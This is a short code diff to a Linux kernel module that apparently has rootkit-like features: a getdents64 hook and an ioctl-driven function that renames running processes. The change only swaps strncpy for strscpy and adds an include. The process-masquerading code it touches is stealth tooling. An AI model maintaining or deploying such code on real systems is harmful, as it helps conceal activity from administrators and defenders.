@@ -13,6 +13,10 @@
 // for getdents64 hook
 #include <linux/fdtable.h>
 #include <linux/proc_ns.h>
+// strscpy/strcmp/memcmp/strlen/strnlen used below — don't rely on another
+// header pulling this in transitively, that chain is not guaranteed stable
+// across kernel versions.
+#include <linux/string.h>
 
 #include "loadable_kernel_module.h"
 
@@ -74,8 +78,10 @@ int change_process_name(const char *orig_name, const char *new_name) {
     rcu_read_lock();
     for_each_process(p) {
         if (strcmp(p->comm, orig_name) == 0) {
-            strncpy(p->comm, new_name, TASK_COMM_LEN - 1);
-            p->comm[TASK_COMM_LEN - 1] = '\0';
+            // strncpy() was removed from the kernel (no NUL-termination guarantee,
+            // unconditional zero-padding caused too many bugs); strscpy() always
+            // NUL-terminates within the given size and is the in-tree replacement.
+            strscpy(p->comm, new_name, sizeof(p->comm));
             found = 1;
             printk(KERN_INFO "Process with original name '%s' found and renamed to '%s'\n", orig_name, new_name);
         }
@@ -331,7 +337,7 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 
 			for (i = 0; i < user_req.len; ++i) {
 				// Only rename if new_name is strictly shorter than orig_name — prevents overflowing p->comm
-				// when strncpy is called in change_process_name.
+				// when strscpy is called in change_process_name.
 				// strnlen guards against non-null-terminated user-filled fields.
 				if (strnlen(req_array[i].new_name, MASQ_LEN) >= strnlen(req_array[i].orig_name, MASQ_LEN)) {
 					// printk(KERN_INFO "Error: New name '%s' should be shorter than original name '%s'\n", req_array[i].new_name, req_array[i].orig_name);
